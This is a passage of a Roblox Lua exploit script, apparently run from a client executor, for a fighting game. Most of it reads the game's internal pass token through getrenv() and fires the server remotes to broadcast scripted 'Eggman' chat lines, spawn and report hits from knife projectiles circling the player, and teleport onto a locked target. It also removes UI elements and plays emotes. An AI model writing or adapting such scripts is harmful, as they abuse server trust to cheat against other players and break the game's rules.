        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase4()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    You think 4 phases is alot heh.. Just you wait]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase5()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Oh look at that another phase!]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase6()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    You thought I was out of phases nahhh]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase7()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Imagine still trying at phase 7]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase8()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ King Dream ]
    Making text for all these phases is getting boring]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase9()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I was just about to not die]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase10()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I was just about to consume this yummy banana but I saw that we are at phase 10]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase11()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    This is getting kinda boring]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase12()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Obama ]
    Lemme be clear this is getting super boring]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase13()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Phase 13 and im still kicking strong]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase14()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I swear if ur going phase by phase to check all of the text]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase15()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    why did I tell myself to do this]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase16()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    :skull: help me]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase17()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I am dying inside]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase18()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    pls help me]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase19()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    the funny]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase20()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Joe mama phase 20]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase21()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    my life is burning]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase22()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    The Sussy imposter is at my door]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase23()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    h e l p m e]], 
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase24()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    whyyyyyyyyyyyyyy]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase25()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Joe sussy]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase26()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    life is going very great and im not dying at all eeeeee]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
function phase27()
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    I really wanna stop]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
end
    local mouse = game.Players.LocalPlayer:GetMouse()
            mouse.KeyDown:Connect(function(k) 
                if k == "p" then
                    if TextBox.Text == "1" then
                        phase1()
                    elseif TextBox.Text == "2" then
                        phase2()
                    elseif TextBox.Text == "3" then
                        phase3()
                    elseif TextBox.Text == "4" then
                        phase4()
                    elseif TextBox.Text == "5" then
                        phase5()
                    elseif TextBox.Text == "6" then
                        phase6()
                    elseif TextBox.Text == "7" then
                        phase7()
                    elseif TextBox.Text == "8" then
                        phase8()
                    elseif TextBox.Text == "9" then
                        phase9()
                    elseif TextBox.Text == "10" then
                        phase10()
                    elseif TextBox.Text == "11" then
                        phase11()
                    elseif TextBox.Text == "12" then
                        phase12()
                    elseif TextBox.Text == "13" then
                        phase13()
                    elseif TextBox.Text == "14" then
                        phase14()
                    elseif TextBox.Text == "15" then
                        phase15()
                    elseif TextBox.Text == "16" then
                        phase16()
                    elseif TextBox.Text == "17" then
                        phase17()
                    elseif TextBox.Text == "18" then
                        phase18()
                    elseif TextBox.Text == "19" then
                        phase19()
                    elseif TextBox.Text == "20" then
                        phase20()
                    elseif TextBox.Text == "21" then
                        phase21()
                    elseif TextBox.Text == "22" then
                        phase22()
                    elseif TextBox.Text == "23" then
                        phase23()
                    elseif TextBox.Text == "24" then
                        phase24()
                    elseif TextBox.Text == "25" then
                        phase25()
                    elseif TextBox.Text == "26" then
                        phase26()
                    elseif TextBox.Text == "27" then
                        phase27()
                    end
                end
            end)
    --//=================================\\
    --||Inf Tp
    --\\=================================//

    local mouse = game.Players.LocalPlayer:GetMouse()
            mouse.KeyDown:Connect(function(k) 
                if k == "r" then
                    function getlockchar()
                        local char = game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                        return char
                    end
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getlockchar().HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                end
            end)

    --//=================================\\
    --||Voice and Text Color
    --\\=================================//
    --night time thing
    local Lighting = game:GetService("Lighting")
    Lighting.ClockTime = time
    Lighting.ClockTime = "24"
    
    game.Players.LocalPlayer.Character.Head.Voice.SoundId = "rbxassetid://1897665684"
    local Player = game.Players.LocalPlayer
    
    Player.Chatted:Connect(function(Chat)
        wait()
        local A_1 =  {
            [1] = getrenv()._G.Pass, 
            [2] = "Chatted", 
            [3] = (Chat), 
            [4] = Color3.fromRGB(1,1,1)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
    
    
    
    end)
    
    --//=================================\\
    --||Sitting Stuff
    --\\=================================//
    
    local sitstart = Instance.new("Animation") 
    sitstart.AnimationId = "rbxassetid://7507477136" 
    local sitstartplay = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):LoadAnimation(sitstart)
    local sitloop = Instance.new("Animation") 
    sitloop.AnimationId = "rbxassetid://7507481748" 
    local sitloopplay = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):LoadAnimation(sitloop)
    local sitend = Instance.new("Animation") 
    sitend.AnimationId = "rbxassetid://7507485912" 
    local sitendplay = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):LoadAnimation(sitend) 
    local sitting = false 
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "q" then if sitting == false then 
            sitting = true
            sitstartplay:Play() 
            wait(1) 
            sitloopplay:Play()
        elseif sitting == true then 
            sitting = false
            sitloopplay:Stop() 
            sitendplay:Play() 
            end
        end 
    end)
    
    
    --//=================================\\
    --||Gui Thingy
    --\\=================================/
    game.Players.LocalPlayer.PlayerGui.UI.Ui.StaminaBar:Destroy()
    game.Players.LocalPlayer.PlayerGui.UI.Ui.ManaBar:Destroy()
    game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Attack:Destroy()
    game.Players.LocalPlayer.PlayerGui.UI.Ui.Info.Defense:Destroy()
    game.Players.LocalPlayer.PlayerGui.UI.Ui.UpdateLog:Destroy()
    game.Players.LocalPlayer.PlayerGui.UI.Ui.UpdateLogInfo:Destroy()
    game:GetService("Players").LocalPlayer.PlayerGui.UI.Ui.MoveDebounceShower.Position = UDim2.new(0, 90000, 0, 900000)
    
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local ImageLabel_2 = Instance.new("ImageLabel")
local ImageLabel_3 = Instance.new("ImageLabel")
local Frame_3 = Instance.new("Frame")
local ImageLabel_4 = Instance.new("ImageLabel")
local TextLabel_5 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
Frame.Position = UDim2.new(0, 0, 0.925644875, 0)
Frame.Size = UDim2.new(0, 208, 0, 13)

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.00451469421, 0, 0.893778503, 0)
TextLabel.Size = UDim2.new(0, 43, 0, 16)
TextLabel.Font = Enum.Font.Arcade
TextLabel.Text = "HP:"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 20.000

TextLabel_2.Parent = ScreenGui
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0285929274, 0, 0.899848282, 0)
TextLabel_2.Size = UDim2.new(0, 72, 0, 16)
TextLabel_2.Font = Enum.Font.Arcade
TextLabel_2.Text = "0/0"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 24.000

Frame_2.Parent = ScreenGui
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.Position = UDim2.new(0, 0, 0.855842233, 0)
Frame_2.Size = UDim2.new(0, 268, 0, 16)

TextLabel_3.Parent = ScreenGui
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(-0.0120391278, 0, 0.793626726, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.Arcade
TextLabel_3.Text = "Drip: Inf/Inf"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 20.000

TextLabel_4.Parent = ScreenGui
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(-0.00677200919, 0, 0.936267078, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.Arcade
TextLabel_4.Text = "Eggman Drip"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextSize = 26.000

ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.20767495, 0, 0.776934803, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 84)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8226687237"

ImageLabel_2.Parent = ScreenGui
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.Position = UDim2.new(0.164785564, 0, 0.880121469, 0)
ImageLabel_2.Size = UDim2.new(0, 49, 0, 51)
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=566134977"

ImageLabel_3.Parent = ScreenGui
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_3.BackgroundTransparency = 1.000
ImageLabel_3.Position = UDim2.new(0.15199399, 0, 0.904400706, 0)
ImageLabel_3.Size = UDim2.new(0, 82, 0, 62)
ImageLabel_3.Image = "http://www.roblox.com/asset/?id=6972422120"

Frame_3.Parent = ScreenGui
Frame_3.BackgroundColor3 = Color3.fromRGB(237, 33, 255)
Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_3.Position = UDim2.new(0, 0, 0.764795125, 0)
Frame_3.Size = UDim2.new(0, 260, 0, 19)

ImageLabel_4.Parent = ScreenGui
ImageLabel_4.BackgroundColor3 = Color3.fromRGB(57, 57, 255)
ImageLabel_4.BackgroundTransparency = 1.000
ImageLabel_4.Position = UDim2.new(0, 0, 0.578148723, 0)
ImageLabel_4.Size = UDim2.new(0, 129, 0, 117)
ImageLabel_4.Image = "http://www.roblox.com/asset/?id=6793162636"

TextLabel_5.Parent = ScreenGui
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.102332585, 0, 0.68133539, 0)
TextLabel_5.Size = UDim2.new(0, 148, 0, 63)
TextLabel_5.Font = Enum.Font.Arcade
TextLabel_5.Text = "Something: Inf/Inf"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextSize = 15.000
    --//=================================\\
    --||Loading 56%
    --\\=================================//
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Notification Bot";
    Text = "Eggman loaded 56%";
    })
    
    --//=================================\\
    --||Red Rocks
    --\\=================================//
    
    
    local userInputService = game:GetService("UserInputService")
    on = true
    posz = 0
    posx = 0
    local perseverance = {
    Parent = game.workspace,
    Name = 'ye',
    Material = Enum.Material.Neon,
    Color = Color3.fromRGB(255, 0, 0),
    Transparency = 0
    }
        times = 0
        _G.soulsmode = 1
    _G.closed = false
    local effects = game.Players.LocalPlayer.Character.Effects
    local rs = game:GetService("RunService")
    
            local player = game.Players.LocalPlayer
    local Character = player.Character
    local args = {
        [1] = {
            [1] = getrenv()._G.Pass,
            [2] = "KnifeProjectileOrange",
            [3] = "Spawn",
            [4] = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector *10 + Vector3.new(math.random(0,35),math.random(0,30),math.random(0,33))
        }
    }
    game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer(unpack(args))
    local projectiles = game.Players.LocalPlayer.Character.Attacks
    for i,v in pairs(projectiles:GetChildren()) do
    if v.Name == "KnifeSlashProjectileOrange" or "Removing" then
        v:WaitForChild("BodyVelocity"):Destroy()
        v:WaitForChild("ParticleEmitter"):Destroy()
        coroutine.resume(coroutine.create(function() 
    
            
    while 
    wait(0.05)
    do
        if _G.closed then
            break
            end
        times = times + 1
        if 
        times == 6
        then 
        times = 0
        end
        if times == 1 then
    v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,40,0)
    elseif times == 2 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(10,40,0)
    elseif times == 3 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,30,10)
    elseif times == 4 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,30,-10)
    elseif times == 5 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(-10,30,0)
        end
    -- Script generated by SimpleSpy - credits to exx#9394
    
    local args1 = {
        [1] = {
            [1] = getrenv()._G.Pass,
            [2] = "KnifeProjectileOrange",
            [3] = "Hit",
            [4] = v,
            [5] = v.CFrame,
            [6] = perseverance
        }
    }
    
    
    if _G.soulsmode == 1 then
    game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer(unpack(args1))
    end
    end
    end))
    end
    end
    --//=================================\\
    --||Effects
    --\\=================================//
    game.Lighting.Bloom.Intensity = 4
    game.Lighting.Bloom.Size = 1.3
    game.Lighting.Bloom.Threshold = 0.8
    game.Lighting.Blur.Size = 5
    game.Lighting.ColorCorrection.Brightness = 0.2
    game.Lighting.ColorCorrection.Saturation = 0.4
    game.Lighting.ColorCorrection.TintColor = Color3.fromRGB(180, 170, 255)
    game.Lighting.Brightness = 3
    --//=================================\\
    --||Black Rocks
    --\\=================================//
    
    wait(14)
    local mode = "DT"
    
    local userInputService = game:GetService("UserInputService")
    on = true
    posz = 0
    posx = 0
    local perseverance = {
    Parent = game.workspace,
    Name = 'ye',
    Material = Enum.Material.Neon,
    Color = Color3.fromRGB(0,0, 0),
    Transparency = 0
    }
        times = 0
        _G.soulsmode = 1
    _G.closed = false
    local effects = game.Players.LocalPlayer.Character.Effects
    local rs = game:GetService("RunService")
    
            local player = game.Players.LocalPlayer
    local Character = player.Character
    local args = {
        [1] = {
            [1] = getrenv()._G.Pass,
            [2] = "KnifeProjectileOrange",
            [3] = "Spawn",
            [4] = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector *10 + Vector3.new(math.random(0,35),math.random(0,30),math.random(0,33))
        }
    }
    game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer(unpack(args))
    local projectiles = game.Players.LocalPlayer.Character.Attacks
    for i,v in pairs(projectiles:GetChildren()) do
    if v.Name == "KnifeSlashProjectileOrange" or "Removing" then
        v:WaitForChild("BodyVelocity"):Destroy()
        v:WaitForChild("ParticleEmitter"):Destroy()
        coroutine.resume(coroutine.create(function() 
    
            
    while 
    wait(0.05)
    do
        if _G.closed then
            break
            end
        times = times + 1
        if 
        times == 6
        then 
        times = 0
        end
        if times == 1 then
    v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,40,0)
    elseif times == 2 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(10,40,0)
    elseif times == 3 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,30,10)
    elseif times == 4 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(0,30,-10)
    elseif times == 5 then
        v.Position = Character.HumanoidRootPart.Position - Vector3.new(-10,30,0)
        end
    -- Script generated by SimpleSpy - credits to exx#9394
    
    local args1 = {
        [1] = {
            [1] = getrenv()._G.Pass,
            [2] = "KnifeProjectileOrange",
            [3] = "Hit",
            [4] = v,
            [5] = v.CFrame,
            [6] = perseverance
        }
    }
    
    
    if _G.soulsmode == 1 then
    game:GetService("ReplicatedStorage").Remotes.CharaMoves:InvokeServer(unpack(args1))
    end
    end
    end))
    end
    end

function Intro()
local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://4575983939"
local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
anim:Play()
wait(0.1)
anim:AdjustSpeed(0.0)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    Hm where am? How did I get here? No matter it seems I'm falling from a great height.]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
wait(10)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    This place seems so strange...]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
wait(5)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    All of the people here are so... weak]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
wait(7)
    local A_1 =  {
              [1] = getrenv()._G.Pass, 
              [2] = "Chatted", 
              [3] = [[[ Eggman ]
    No matter, I'll just entertain myself for the time being]],
              [4] = Color3.fromRGB(255, 0, 0)
        }
        local Event = game:GetService("ReplicatedStorage").Remotes.Events
        Event:FireServer(A_1)
anim:AdjustSpeed(1)
game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
end

    --//=================================\\
    --||Loading 87%
    --\\=================================//

game.Players.LocalPlayer.Character.Humanoid.HipHeight = 500
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Notification Bot";
    Text = "Eggman Loaded";
    })

Intro()
    --//=================================\\
    --||Slashes
    --\\=================================//
    
    local player = game.Players.LocalPlayer
    local m = player:GetMouse()
    local toggle = false
    m.KeyDown:Connect(function(k)
    if k == 'm' then
    if not toggle then
    toggle = true
    local radius = 50--how far away do you want the parts to be from you
    local circle = math.pi * 2-- Gets a full circle
    local char = game.Players.LocalPlayer.Character
    local tab = {}--Creates a table so you can insert values inside
    local amm = 5---amount of projectiles
    pass = getrenv()._G.Pass
    for i = 1,amm,1 do
    spawn(function()
    local A_1 =  {
         [1] = pass, 
         [2] = "KnifeProjectile", 
         [3] = "Spawn", 
         [4] = (char.HumanoidRootPart.CFrame*CFrame.new(1,100,-10)).p
    }
    local Event = game:GetService("ReplicatedStorage").Remotes.CharaMoves
    Event:InvokeServer(A_1)
    end)
    end
    am = 0
    local detect
    local detect2
    val = Instance.new('NumberValue',player)-- creates a value instance so you can use it in a connect function
    val.Name = 'KnifeSlashes Amount'
    detect = char.Attacks.ChildAdded:Connect(function(pp)-- this will detect if a child is added to the character
    if pp.Name == 'KnifeSlashProjectile' then
        table.insert(tab,pp)--it will insert the blasts to the table
    am = am + 1--adds the numbers
    val.Value = am--set the Number value to that number
    pp:WaitForChild('BodyVelocity'):Destroy()
    pp:WaitForChild('Hitted'):Destroy()
    pp:WaitForChild('Particle'):WaitForChild('ParticleEmitter'):Destroy()
    end
    end)
    
    detect2 = val:GetPropertyChangedSignal("Value"):Connect(function()-- detects if the value is equal to the amount of time the remote is fired
    if val.Value == amm then
    tab2 = {}
    for _,v in pairs(tab) do---will look through the tables
    v.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(math.random(-20,20),1000,math.random(-20,20))
    v1 = Instance.new('BodyPosition',v)
    fol = Instance.new('Folder',v1)
    v1.Name = 'Client'
    v1.MaxForce = Vector3.new(1,1,1)*100000
    v1.D = 500
    v1.P = 30000
    v1.Position = (char.HumanoidRootPart.CFrame).p + Vector3.new(0,0,0)
            table.insert(tab2,v1)
    end
    
    
    
    for i = 1,#tab2 do
    spawn(function()
    local angle = circle / #tab2 * i---this will get the amount of parts you have and multiply with the current i to get the proper postion to make a circle
        local part = tab2[i]
    local  mspeed = 0
    while true do
        wait()
        mspeed = mspeed + 99999999999-- change it to a higher number if u want it faster
        local x_pos = math.cos(angle) * radius
        local y_pos = math.sin(angle) * radius
        local cf = char.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(0), math.rad(mspeed),math.rad(0)) *CFrame.new(x_pos, 0, y_pos)
    part.Position = cf.p
    end
    end)
    end
    val:Destroy()
    detect:Disconnect()
    detect2:Disconnect()
    end
    end)
    elseif toggle then
    toggle = false
    --make orbs dissapear
    end
    
    end
    end)
    
    --//=================================\\
    --||Lmb thing
    --\\=================================//


    --//=================================\\
    --||trident
    --\\=================================//
--[[
pls = game:GetService'Players'
rs = game:GetService'RunService'
uinps = game:GetService'UserInputService'
lp = pls.LocalPlayer
mouse = lp:GetMouse()
c = lp.Character
human = c.Humanoid
critTime = .27
--------------------------------------------------------
local cf0 = CFrame.new(0,-0.80,0) * CFrame.Angles(-3,-1.50,0)
local h = Instance.new("Part",c)
h.Name = "Trident"
h.BrickColor = BrickColor.new(1,0,0)
h.Material = "Neon"
h.Size = Vector3.new(2,1,10)
h.Locked = true
h.CanCollide = false
h.Name = "Handle"
local m = Instance.new("SpecialMesh",h)
m.MeshType = "FileMesh"
m.Scale = Vector3.new(1.5,2.3,2.3)
m.MeshId = "http://www.roblox.com/asset/?id=1718593649"
local hw = Instance.new("Motor",game.Players.LocalPlayer.Character["Right Arm"])
hw.Name = "HandleWeld"
hw.Part0 = game.Players.LocalPlayer.Character["Right Arm"]
hw.Part1 = h
hw.C0 = cf0:Inverse()
local l = Instance.new("PointLight",h)
l.Range = 15
l.Brightness = .6
l.Color = Color3.new(1,0,0)
]]
    --//=================================\\
    --||Taunts
    --\\=================================//
    
    --Clap Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "z" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7515642035"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    anim:AdjustSpeed(1)
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "z" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "Good Show!", 
                    [4] = Color3.new(1, 0, 0),
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    --Flex Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "x" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7515664467"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "x" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "Hmph weakling..", 
                    [4] = Color3.new(1, 0, 0),
                }
            local Event = game:GetService("ReplicatedStorage").Remotes.Events
            Event:FireServer(A_1)
    end
    end)
    
    --Bow Emote
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k)
        if k == "c" then 
    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://7515663367"
    local anim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
    anim:Play()
    end
    end)
    
    local mouse = game.Players.LocalPlayer:GetMouse()
    mouse.KeyDown:Connect(function(k) 
        wait(0.2)
        if k == "c" then
            local A_1 = 
                {
                    [1] = getrenv()._G.Pass,
                    [2] = "Chatted", 
                    [3] = "I respect you for challenging me.", 
                    [4] = Color3.new(1, 0, 0),
                }
